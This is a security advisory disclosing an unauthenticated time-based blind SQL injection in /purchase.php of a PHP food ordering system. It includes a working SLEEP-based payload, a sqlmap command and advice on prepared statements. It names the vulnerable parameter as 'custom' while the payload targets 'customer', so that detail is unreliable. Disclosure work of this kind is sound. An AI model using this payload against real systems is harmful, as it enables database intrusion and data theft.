# sourcecodester Food Ordering System (for POSBANG) V1.0 /purchase.php SQL injection

# NAME OF AFFECTED PRODUCT(S)
+ Food Ordering System (for POSBANG)

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/13481/food-ordering-system-posbang.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /purchase.php

## Vulnerability location:
+ 'custom' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/download-code?nid=13481&title=Food+Ordering+System+%28for+POSBANG%29)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/purchase.php' file of the 'Food Ordering System (for POSBANG)' project. The reason for this issue is that attackers inject malicious code from the parameter 'custom' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Food Ordering System (for POSBANG)", WeQi discovered a critical SQL injection vulnerability in the "/purchase.php" file. This vulnerability stems from insufficient user input validation of the 'custom' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:

+ time-based blind

## Payload:
```plain
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: quantity_0=&quantity_1=&quantity_2=&quantity_3=&quantity_4=&quantity_5=&productid[]=19||6&quantity_6=&customer=2' AND (SELECT 5578 FROM (SELECT(SLEEP(5)))FSgh) AND 'aXtV'='aXtV
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u "http://localhost/purchase.php" --data="quantity_0=&quantity_1=&quantity_2=&quantity_3=&quantity_4=&quantity_5=&productid[]=19||6&quantity_6=&customer=2" --batch
```

![](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773111574421-b55dbc9b-0370-4cdc-9ae9-b71127a4779f.png)



# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
